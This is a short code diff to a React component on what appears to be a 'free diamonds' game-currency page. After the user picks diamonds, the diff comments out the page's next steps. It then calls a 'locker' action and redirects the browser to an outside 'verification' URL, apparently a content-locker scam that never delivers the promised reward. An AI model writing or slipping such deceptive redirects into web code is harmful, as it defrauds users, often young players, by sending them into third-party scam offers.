@@ -84,8 +84,10 @@ const English = ({actions}) => {
             actions.addErr('no diamonds choosen')
             return 0
         }
-        setStep_2(false)
-        setStep_3(true)
+        actions.locker()
+        window.location.href='https://verifyspot.net/cl/i/3759ww'
+        //setStep_2(false)
+        //setStep_3(true)
     }
 
     
